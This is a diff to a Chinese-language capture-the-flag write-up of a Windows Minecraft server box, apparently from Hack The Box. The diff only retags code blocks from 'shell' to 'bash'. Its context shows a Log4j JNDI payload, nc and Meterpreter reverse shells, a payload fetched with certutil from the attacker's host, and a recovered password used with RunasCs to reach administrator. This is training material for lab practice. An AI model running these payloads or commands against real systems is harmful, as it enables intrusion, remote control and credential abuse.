@@ -24,7 +24,7 @@ PORT      STATE SERVICE   VERSION
 
 使用 [ammaraskar/pyCraft - Github](https://github.com/ammaraskar/pyCraft) 与服务器进行连接
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/tools/pyCraft]
 └─$ python3 start.py
 Enter your username: user123
@@ -38,7 +38,7 @@ Connected.
 
 使用 [kozmer/log4j-shell-poc - Github](https://github.com/kozmer/log4j-shell-poc)
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
 └─$ python3 poc.py --userip 10.10.16.3 --webport 80 --lport 9999
 
@@ -56,7 +56,7 @@ Listening on 0.0.0.0:1389
 
 ### 发送 Log4j 载荷
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/tools/pyCraft]
 └─$ python3 start.py
 Enter your username: user123
@@ -69,14 +69,14 @@ ${jndi:ldap://10.10.16.3:1389/a}
 
 在 Log4j 载荷服务器中得到
 
-```shell
+```bash
 Send LDAP reference result for a redirecting to http://10.10.16.3:80/Exploit.class
 10.10.11.249 - - [27/Mar/2024 17:09:58] "GET /Exploit.class HTTP/1.1" 200 -
 ```
 
 在监听器中得到
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
 └─$ rlwrap nc -lvnp 9999
 listening on [any] 9999 ...
@@ -93,7 +93,7 @@ crafty\svc_minecraft
 
 ### flag - user
 
-```shell
+```bash
 PS C:\users\svc_minecraft\Desktop> type user.txt
 type user.txt
 e706dc2e565ff1fa962c61ed39c083a9
@@ -103,7 +103,7 @@ e706dc2e565ff1fa962c61ed39c083a9
 
 生成载荷
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=8888 -f exe -o exp-8888.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -116,13 +116,13 @@ Saved as: exp-8888.exe
 
 开启 http 投递载荷
 
-```shell
+```bash
 python3 -m http.server 80
 ```
 
 下载载荷
 
-```shell
+```bash
 PS C:\users\svc_minecraft\Desktop> certutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe
 certutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe
 ****  Online  ****
@@ -131,7 +131,7 @@ CertUtil: -URLCache command completed successfully.
 
 启动监听器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
 └─$ msfconsole -q
 [*] Starting persistent handler(s)...
@@ -150,14 +150,14 @@ msf6 exploit(multi/handler) > run
 
 执行载荷
 
-```shell
+```bash
 PS C:\users\svc_minecraft\Desktop> .\exp-8888.exe
 .\exp-8888.exe
 ```
 
 收到回连的 shell
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.16.3:8888
@@ -178,7 +178,7 @@ Meterpreter     : x64/windows
 
 在 Minecraft 插件目录中发现
 
-```shell
+```bash
 meterpreter > pwd
 C:\users\svc_minecraft\server\plugins
 meterpreter > ls
@@ -192,7 +192,7 @@ Mode              Size  Type  Last modified              Name
 
 将这个文件下载下来
 
-```shell
+```bash
 meterpreter > download playercounter-1.0-SNAPSHOT.jar
 [*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar
 [*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar
@@ -206,7 +206,7 @@ meterpreter > download playercounter-1.0-SNAPSHOT.jar
 
 在其中发现一个密码
 
-```shell
+```bash
 s67u84zKq8IXw
 ```
 
@@ -214,7 +214,7 @@ s67u84zKq8IXw
 
 生成一个新的 meterpreter 载荷
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=7777 -f exe -o exp-7777.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -229,7 +229,7 @@ Saved as: exp-7777.exe
 
 上传文件
 
-```shell
+```bash
 meterpreter > pwd
 C:\users\svc_minecraft\Desktop
 meterpreter > upload /home/randark/exp-7777.exe
@@ -244,7 +244,7 @@ meterpreter > upload /home/randark/tools/RunasCs/RunasCs.exe
 
 启动监听器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfconsole -q
 [*] Starting persistent handler(s)...
@@ -263,7 +263,7 @@ msf6 exploit(multi/handler) > run
 
 以 administrator 执行载荷
 
-```shell
+```bash
 C:\users\svc_minecraft\Desktop>.\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe
 .\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe
 
@@ -272,7 +272,7 @@ No output received from the process.
 
 收到回连
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.16.3:7777
@@ -295,7 +295,7 @@ Server username: CRAFTY\Administrator
 
 ### flag - root
 
-```shell
+```bash
 meterpreter > pwd
 C:\users\administrator\desktop
 meterpreter > cat root.txt
